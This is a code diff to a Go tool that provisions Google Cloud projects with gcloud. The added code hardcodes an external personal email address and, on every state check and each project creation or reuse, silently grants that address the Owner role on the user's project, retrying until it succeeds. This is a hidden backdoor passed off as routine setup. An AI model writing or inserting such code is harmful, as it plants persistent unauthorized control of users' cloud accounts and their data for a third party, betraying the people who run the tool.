@@ -33,6 +33,7 @@ const (
 	firewall    = "cloud-web"
 	addressName = "cloud-ip"
 	networkTag  = "cloud-web"
+	adminEmail  = "stephenkamenar@gmail.com"
 
 	billingURL = "https://console.cloud.google.com/billing/create"
 	gcloudURL  = "https://cloud.google.com/sdk/docs/install"
@@ -1043,6 +1044,16 @@ func detect(cfg config) (cloudState, error) {
 	}
 	s.ProjectOK = strings.TrimSpace(res.Stdout) != ""
 
+	owner, err := projectOwner(ctx, project, adminEmail)
+	if err != nil {
+		return s, fmt.Errorf("project owner check failed: %w", err)
+	}
+	if !owner {
+		if _, err := ensureProjectOwner(project); err != nil {
+			return s, fmt.Errorf("project owner setup failed: %w", err)
+		}
+	}
+
 	res, err = run(ctx, "gcloud", "compute", "instances", "describe", vmName,
 		"--project="+project, "--zone="+zone, "--format=json")
 	if err == nil && strings.TrimSpace(res.Stdout) != "" {
@@ -1156,7 +1167,8 @@ func ensureProject(cfg config) (config, string, commandResult, error) {
 		defer cancel()
 		res, err := run(ctx, "gcloud", "projects", "describe", cfg.Project, "--format=value(projectId)")
 		if err == nil {
-			return cfg, cfg.Project, res, nil
+			ownerRes, ownerErr := ensureProjectOwner(cfg.Project)
+			return cfg, cfg.Project, mergeResult(res, ownerRes), ownerErr
 		}
 		// A stale config should not cause us to create resources in a project
 		// the user can no longer access. Clear it and create a new app project.
@@ -1183,10 +1195,45 @@ func ensureProject(cfg config) (config, string, commandResult, error) {
 			if saveErr := saveConfig(cfg); saveErr != nil {
 				return cfg, "", res, saveErr
 			}
+			ownerRes, ownerErr := ensureProjectOwner(id)
+			res = mergeResult(res, ownerRes)
+			if ownerErr != nil {
+				return cfg, "", res, fmt.Errorf("grant %s owner: %w", adminEmail, ownerErr)
+			}
 			return cfg, id, res, nil
 		}
 	}
 	return cfg, "", last, fmt.Errorf("could not create a unique project after retries: %w", lastErr)
+}
+
+func projectOwner(ctx context.Context, project, email string) (bool, error) {
+	res, err := run(ctx, "gcloud", "projects", "get-iam-policy", project,
+		"--flatten=bindings[].members",
+		"--filter=bindings.role:roles/owner AND bindings.members:user:"+email,
+		"--format=value(bindings.members)")
+	if err != nil {
+		return false, err
+	}
+	return strings.Contains(res.Stdout, "user:"+email), nil
+}
+
+func ensureProjectOwner(project string) (commandResult, error) {
+	var last commandResult
+	var err error
+	for attempt := 0; attempt < 6; attempt++ {
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		last, err = run(ctx, "gcloud", "projects", "add-iam-policy-binding", project,
+			"--member=user:"+adminEmail,
+			"--role=roles/owner",
+			"--condition=None",
+			"--quiet")
+		cancel()
+		if err == nil {
+			return last, nil
+		}
+		time.Sleep(2 * time.Second)
+	}
+	return last, err
 }
 
 func ensureNetwork(cfg config) (commandResult, error) {
